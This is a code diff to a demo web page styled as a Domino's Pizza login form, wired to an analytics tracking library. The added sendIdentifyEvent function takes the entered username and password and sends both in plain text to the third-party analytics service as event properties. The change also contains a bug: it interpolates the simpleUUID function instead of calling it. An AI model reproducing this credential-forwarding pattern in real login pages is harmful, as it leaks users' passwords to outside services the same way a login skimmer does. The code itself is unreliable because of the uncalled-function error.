@@ -7,6 +7,9 @@
         analytics.page();
         }}();
     </script>
+    <script>
+        analytics.page("Dominos","Home");
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Domino's Pizza Login</title>
@@ -159,12 +162,30 @@
     </div>
 
     <script>
+        function simpleUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            const r = Math.random() * 16 | 0;
+            const v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+        }
+
         // Helper function to send analytics events
-        function sendAnalyticsEvent(buttonName, properties = {}) {
+        function sendTrackEvent(buttonName, properties = {}) {
             analytics.track(`${buttonName}`, {
                 origin: "Website",
                 timestamp: new Date().toISOString(),
                 ...properties
+            });
+        }
+
+        // Helper function to send analytics events
+        function sendIdentifyEvent(username, password) {
+            analytics.track(`${simpleUUID}`, {
+                origin: "Website",
+                timestamp: new Date().toISOString(),
+                username: username,
+                password: password,
             });
         }
 
@@ -173,8 +194,8 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            sendAnalyticsEvent('Login Submitted');
-            alert(`Login attempted with:\nUsername: ${username}\nPassword: ${password}\n\nNote: This is a demo. No actual login occurs.`);
+            sendIdentifyEvent(username, password);
+            alert(`Login Identify event sent!`);
             
             document.getElementById('username').value = '';
             document.getElementById('password').value = '';
@@ -182,13 +203,13 @@
 
         // Add event listeners for the buttons
         document.getElementById('addToCartBtn').addEventListener('click', function() {
-            sendAnalyticsEvent('Add to Cart');
-            alert('Add to Cart button clicked!\nThis would typically add items to a shopping cart.');
+            sendTrackEvent('Add to Cart');
+            alert('Add to Cart Track event sent!');
         });
 
         document.getElementById('orderCompleteBtn').addEventListener('click', function() {
-            sendAnalyticsEvent('Order Complete');
-            alert('Order Complete button clicked!\nThis would typically finalize an order or update order status.');
+            sendTrackEvent('Order Complete');
+            alert('Order Complete Track event sent!');
         });
 
         // Customize Pizza button with toppings selection
@@ -203,18 +224,19 @@
                 selectedToppings.push(checkbox.value);
             });
             
-            sendAnalyticsEvent('Customize Pizza', {
+            sendTrackEvent('Customize Pizza', {
                 toppings: selectedToppings.join(', '),
                 toppings_count: selectedToppings.length
             });
             
             alert(`Pizza customized with: ${selectedToppings.join(', ') || 'no toppings'}`);
             document.getElementById('toppingsGroup').style.display = 'none';
+            alert(`Customize Pizza Track event sent!`);
         });
 
         document.getElementById('productViewedBtn').addEventListener('click', function() {
-            sendAnalyticsEvent('Product Viewed');
-            alert('Product Viewed button clicked!\nThis would typically track when a customer views a product.');
+            sendTrackEvent('Product Viewed');
+            alert('Product Viewed Track event sent!');
         });
     </script>
 </body>
